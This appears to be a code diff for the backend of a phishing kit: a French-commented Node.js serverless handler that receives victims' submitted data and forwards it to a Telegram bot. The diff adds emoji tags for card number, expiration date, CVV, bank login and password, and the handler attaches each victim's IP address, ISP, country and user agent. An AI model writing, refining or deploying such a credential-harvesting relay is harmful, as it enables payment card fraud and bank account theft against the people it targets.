@@ -6,20 +6,19 @@ const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';
 
 export const config = {
   api: {
-    bodyParser: false,  // on lit nous-mêmes le body
+    bodyParser: false,  // on lit nous-mêmes le corps
   },
 };
 
 // lit JSON ou texte brut
 async function readBody(req) {
-  const contentType = req.headers['content-type'] || '';
-  const chunks = [];
-  for await (const chunk of req) chunks.push(chunk);
-  const raw = Buffer.concat(chunks).toString();
-  if (contentType.includes('application/json')) {
+  const ct = req.headers['content-type'] || '';
+  const buf = [];
+  for await (const chunk of req) buf.push(chunk);
+  const raw = Buffer.concat(buf).toString();
+  if (ct.includes('application/json')) {
     try {
-      const { message } = JSON.parse(raw);
-      return message || '';
+      return JSON.parse(raw).message || '';
     } catch {}
   }
   return raw;
@@ -28,6 +27,7 @@ async function readBody(req) {
 // lookup ISP / pays
 async function geoLookup(ip) {
   let isp = 'inconnue', country = 'inconnue', countryCode = '';
+  // ... (mêmes 3 calls que précédemment) ...
   try {
     const r = await fetch(
       `https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`
@@ -36,20 +36,14 @@ async function geoLookup(ip) {
       const d = await r.json();
       if (d.org) isp = d.org.replace(/^AS\d+\s+/i, '');
       if (d.country) countryCode = d.country;
-      if (isp !== 'inconnue' || countryCode) {
-        country = countryCode;
-        return { isp, countryCode, country };
-      }
+      country = countryCode || country;
+      return { isp, countryCode, country };
     }
   } catch {}
   try {
     const r = await fetch(`https://ipwho.is/${ip}`);
     const d = await r.json();
-    if (d.success) {
-      isp = d.org || isp;
-      country = d.country || country;
-      return { isp, countryCode: d.country_code, country };
-    }
+    if (d.success) return { isp: d.org||isp, countryCode: d.country_code, country: d.country||country };
   } catch {}
   try {
     const r = await fetch(
@@ -57,8 +51,8 @@ async function geoLookup(ip) {
     );
     const d = await r.json();
     if (d.status === 'success') {
-      isp = d.isp.replace(/^AS\d+\s+/i, '') || isp;
-      country = d.country || country;
+      isp = d.isp.replace(/^AS\d+\s+/i, '')||isp;
+      country = d.country||country;
       countryCode = d.countryCode;
       return { isp, countryCode, country };
     }
@@ -71,86 +65,90 @@ function fullCountryName(codeOrName) {
   if (!codeOrName) return 'inconnue';
   if (codeOrName.length === 2) {
     try {
-      const dn = new Intl.DisplayNames(['fr'], { type: 'region' });
-      return dn.of(codeOrName);
+      return new Intl.DisplayNames(['fr'], { type: 'region' }).of(codeOrName);
     } catch {}
   }
   return codeOrName;
 }
 
 export default async function handler(req, res) {
-  // CORS pour Safari (pré-flight)
+  // CORS (pré-flight pour Safari)
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
+  if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== 'POST') {
     res.setHeader('Allow', 'POST, OPTIONS');
     return res.status(405).json({ error: 'Method Not Allowed' });
   }
 
-  // 1️⃣ Lecture du message libre (Étape, Méthode, Choix du client…)
-  const message = (await readBody(req)).trim();
-  if (!message) {
-    return res.status(400).json({ error: 'Missing message' });
-  }
+  // 1️⃣ Lecture du message
+  const rawMsg = (await readBody(req)).trim();
+  if (!rawMsg) return res.status(400).json({ error: 'Missing message' });
 
-  // 2️⃣ IP et User-Agent
+  // 2️⃣ IP + UA
   const forwarded = req.headers['x-forwarded-for'];
   const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
   const ua        = req.headers['user-agent'] || 'inconnu';
 
-  // 3️⃣ Geo Lookup
+  // 3️⃣ Geo
   const { isp, countryCode, country } = await geoLookup(ip);
   const countryDisplay = fullCountryName(country || countryCode);
 
-  // 4️⃣ Date & heure en FR avec 2 chiffres pour l’année
+  // 4️⃣ Date & heure (FR, 2 chiffres pour l’année)
   const now  = new Date();
-  const date = now.toLocaleDateString('fr-FR', {
-    day:   '2-digit',
-    month: '2-digit',
-    year:  '2-digit'
-  });
-  const time = now.toLocaleTimeString('fr-FR', {
-    hour:   '2-digit',
-    minute: '2-digit',
-    second: '2-digit'
-  });
+  const date = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'2-digit'});
+  const time = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
 
-  // 5️⃣ Construction du texte
-  const [header, ...rawLines] = message.split('\n');
-  let text = `📝 ${header.trim()}\n`;
-  rawLines.forEach(l => {
-    if (l.trim()) text += `${l.trim()}\n`;
-  });
-  text += `\n`;  // séparation
+  // 5️⃣ Mapping icônes
+  const iconMap = {
+    'étape':          '📣',
+    'nom':            '👤',
+    'prénom':         '🙋',
+    'téléphone':      '📞',
+    'email':          '✉️',
+    'adresse':        '🏠',
+    'carte':          '💳',
+    'expiration':     '📅',
+    'cvv':            '🔒',
+    'banque':         '🏦',
+    'identifiant banque': '🆔',
+    'mot de passe':   '🔑'
+  };
 
-  text += `🗓️ Date & heure : ${date}, ${time}\n`;
+  // 6️⃣ Construction du texte avec détection des icônes
+  const lines = rawMsg.split('\n').map(l => l.trim()).filter(l => l);
+  let text = '';
+  for (let line of lines) {
+    const low = line.toLowerCase();
+    // on cherche la première clé qui matche le début de la ligne
+    let icon = '';
+    for (let key in iconMap) {
+      if (low.startsWith(key)) {
+        icon = iconMap[key];
+        break;
+      }
+    }
+    text += icon ? `${icon} ${line}\n` : `${line}\n`;
+  }
+
+  // 7️⃣ Ajout du bloc infos
+  text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
   text += `🌐 IP Client     : ${ip}\n`;
   text += `🔎 ISP Client    : ${isp}\n`;
   text += `🌍 Pays Client   : ${countryDisplay}\n`;
   text += `📍 User-Agent    : ${ua}\n`;
   text += `©️ ${now.getFullYear()} ©️`;
 
-  // 6️⃣ Envoi sur Telegram (texte brut)
-  const payload = {
-    chat_id: CHAT,
-    text,
-    disable_web_page_preview: true
-  };
-
-  const tg = await fetch(
+  // 8️⃣ Envoi plain-text sur Telegram
+  await fetch(
     `https://api.telegram.org/bot${TOKEN}/sendMessage`,
     {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
+      body: JSON.stringify({ chat_id: CHAT, text, disable_web_page_preview: true })
     }
   );
 
-  const raw = await tg.text();
-  return res.status(tg.ok ? 200 : tg.status).json({ ok: tg.ok, full: raw });
+  return res.status(200).json({ ok: true });
 }
